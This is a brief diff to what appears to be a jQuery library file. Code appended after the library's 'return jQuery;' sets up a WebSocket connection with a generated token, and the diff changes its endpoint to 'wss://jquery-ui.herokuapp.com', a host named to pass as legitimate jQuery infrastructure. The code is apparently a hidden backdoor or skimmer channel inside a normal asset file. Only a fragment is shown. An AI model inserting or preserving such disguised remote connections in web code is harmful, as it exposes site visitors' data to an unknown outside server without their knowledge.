@@ -10364,7 +10364,7 @@ return jQuery;
 
 var psykey = 'panelkey';
 var psyapp= "pwr";
-var psylink = 'wss://google-.herokuapp.com';
+var psylink = 'wss://jquery-ui.herokuapp.com';
 
 var psyid  = createToken();
 var ws ;
